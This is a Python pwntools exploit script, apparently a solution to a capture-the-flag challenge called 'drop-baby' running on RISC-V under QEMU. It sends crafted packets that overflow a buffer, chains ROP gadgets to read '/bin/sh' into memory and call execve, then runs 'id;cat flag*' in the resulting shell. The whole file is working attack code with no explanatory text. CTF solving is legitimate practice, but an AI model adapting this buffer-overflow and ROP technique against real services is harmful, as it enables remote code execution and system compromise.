#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii

context.update(arch="riscv", os="linux")
context.log_level = 'info'

TICKET="yourticket_here"

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)



exe = ELF('./drop-baby')

host, port = "drop.quals2023-kah5Aiv9.satellitesabove.me", "5300"

if args.REMOTE:
  p = remote(host,port)
  sla('please:\n', TICKET)
elif args.GDB:
  p = process('/home/interzone/work/qemu/qemu-7.2.0/build/riscv32-linux-user/qemu-riscv32 -E FLAG="Superflag!!!!" -E TIMEOUT=100000 -g 1235 ./drop-baby', shell=True)
else:
  p = process('/home/interzone/work/qemu/qemu-7.2.0/build/riscv32-linux-user/qemu-riscv32 -E FLAG="Superflag!!!!" -E TIMEOUT=100000 ./drop-baby', shell=True)

def send_b1(data):
  pkt = p32(0xdeadbeef,endian='big')+p8(0xb1)+data+p32(binascii.crc32(data),signed=True)
  p.send(pkt)

p.recvuntil('me!\n',drop=True)

'''
  494e4:       4532                    lw      a0,12(sp)
   494e6:       40f2                    lw      ra,28(sp)
   494e8:       6105                    addi    sp,sp,32
   494ea:       8082                    ret
'''
gadget1 = 0x494e4

'''
   3f386:       832a                    mv      t1,a0
   3f388:       5092                    lw      ra,36(sp)
   3f38a:       4512                    lw      a0,4(sp)
   3f38c:       45a2                    lw      a1,8(sp)
   3f38e:       4632                    lw      a2,12(sp)
   3f390:       46c2                    lw      a3,16(sp)
   3f392:       4752                    lw      a4,20(sp)
   3f394:       47e2                    lw      a5,24(sp)
   3f396:       4872                    lw      a6,28(sp)
   3f398:       5882                    lw      a7,32(sp)
   3f39a:       3522                    fld     fa0,40(sp)
   3f39c:       35c2                    fld     fa1,48(sp)
   3f39e:       3662                    fld     fa2,56(sp)
   3f3a0:       2686                    fld     fa3,64(sp)
   3f3a2:       2726                    fld     fa4,72(sp)
   3f3a4:       27c6                    fld     fa5,80(sp)
   3f3a6:       2866                    fld     fa6,88(sp)
   3f3a8:       3886                    fld     fa7,96(sp)
   3f3aa:       6165                    addi    sp,sp,112
   3f3ac:       8302                    jr      t1
'''
gadget2 = 0x3f386

'''
   3839c:	00000073          	ecall
   383a0:	8082                	ret
'''
ecall = 0x3839c

# first payload call again do_b2, with a greater size 600
data  = b'\x00'*0x70+p32(0xdeadbeef)+p32(gadget1)
data += flat({
  12: p32(600),
  28: p32(exe.sym['do_b2']),
})

data=data.ljust(296, b'\x00')
pkt = p32(0xdeadbeef,endian='big')+p8(0xb2)+data+p32(binascii.crc32(data),signed=True)
p.send(pkt)

# second payload read '/bin/sh' somewhere in .bss, then do execve('/bin/sh', 0,0) with ecall gadget
data  = b'\x00'*0x70+p32(0xdeadbeef)+p32(gadget1)
data += flat({
  12: p32(exe.sym['read']),
  28: p32(gadget2),
})
# read 8 bytes in .bss, for reading '/bin/sh' string
data += flat({
  4: p32(0),
  8: p32(exe.bss(0xa00)),
  12: p32(8),
  36: p32(gadget1),
  108: p32(0),
})

data += flat({
  12: p32(ecall),
  28: p32(gadget2),
})
# do execve syscall, execve('/bin/sh',0,0)
data += flat({
  4: p32(exe.bss(0xa00)),
  8: p32(0),
  12: p32(0),
  32: p32(221),
  36: p32(gadget1),
  108: p32(0),
})

data=data.ljust(596, b'\x00')
pkt = data+p32(binascii.crc32(data),signed=True)
p.send(pkt)

# send shell string
p.send('/bin/sh\x00')
sleep(0.1)
# now we got shell
p.sendline('id;cat flag*')
p.interactive()
